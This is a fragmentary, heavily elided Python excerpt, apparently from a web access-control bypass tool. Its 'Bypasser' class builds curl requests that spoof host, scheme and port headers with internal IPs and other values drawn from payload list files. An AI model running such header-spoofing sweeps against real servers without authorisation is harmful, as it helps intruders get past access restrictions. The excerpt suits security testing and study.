...
class Bypasser:
    ...
    const_internal_ips = file_to_list("payloads/const_internal_ips.lst")
    const_http_methods = file_to_list("payloads/const_http_methods.lst")
    const_header_schemes = file_to_list("payloads/const_header_schemes.lst")
    const_protos = file_to_list("payloads/const_protos.lst")
    const_header_ports = file_to_list("payloads/const_header_ports.lst")
    const_ports = file_to_list("payloads/const_ports.lst")
    const_header_hosts = file_to_list("payloads/const_header_hosts.lst")
    const_paths = file_to_list("payloads/const_paths.lst")
                ...
                if (
                    ...
                    for const_internal_ip in Bypasser.const_internal_ips:
                        cmd = [
                            *self.base_curl,
                            "-H",
                            f"{const_header_host}: {const_internal_ip}",
                            target_url,
                        ]
                        item = CurlItem(
                            url_obj,
                    ...
                    cmd = [
                        *self.base_curl,
                        "-H",
                        f"{const_header_host}: {url_public_ip}",
                        target_url,
                    ]
                    item = CurlItem(
                        url_obj,
            ...
            for const_header_scheme in Bypasser.const_header_schemes:
                for const_proto in Bypasser.const_protos:
                    cmd = [
                        *self.base_curl,
                        "-H",
                        f"{const_header_scheme}: {const_proto}",
                        target_url,
                    ]
                    item = CurlItem(
                        url_obj,
                ...
                if self.spoof_ports:
                    ...
                    for spoof_port in self.spoof_ports:
                        cmd = [
                            *self.base_curl,
                            "-H",
                            f"{const_header_port}: {spoof_port}",
                            target_url,
                        ]
                        item = CurlItem(
                            url_obj,
                ...
                if (
                    ...
                    for const_port in Bypasser.const_ports:
                        cmd = [
                            *self.base_curl,
                            "-H",
                            f"{const_header_port}: {const_port}",
                            target_url,
                        ]
                        item = CurlItem(
                            url_obj,
